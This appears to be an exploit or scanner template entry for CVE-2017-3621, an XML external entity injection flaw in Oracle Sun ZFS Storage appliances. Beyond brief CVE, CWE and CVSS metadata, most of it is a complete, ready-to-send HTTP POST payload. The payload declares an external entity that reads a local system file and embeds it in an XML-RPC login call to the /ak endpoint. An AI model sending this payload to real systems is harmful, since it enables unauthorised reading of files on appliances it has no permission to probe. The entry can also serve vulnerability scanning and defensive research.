Oracle Sun ZFS Storage XML External Entitiy (XXE) Injection

CVE: CVE-2017-3621
Description: Oracle Sun ZFS is affacted by XML External Entity Injection (XXE)
Vulnerable Versions: AK 2013 and before
CWE: CWE-611
CVSS: 3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H - 7.5

Reference:

https://www.oracle.com/security-alerts/cpuapr2017.html

Payload:

POST /ak HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/xml
Content-Length: 735
 
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://etc/hosts"> ]>
<methodCall>
<methodName>system.multicall</methodName>
<params>
<param>
<value><array><data><value><struct><member><name>methodName</name><value><string>system.login</string></value></member><member><name>params</name><value><array><data><value><string>&xxe;</string></value><value><string>1111</string></value></data></array></value></member></struct></value><value><struct><member><name>methodName</name><value><string>appliance.sysinfo</string></value></member></struct></value></data></array></value></param><param><value><struct><member>
<name>abortOnFailure</name><value><boolean>1</boolean></value></member></struct></value>
</param>
</params>
</methodCall>
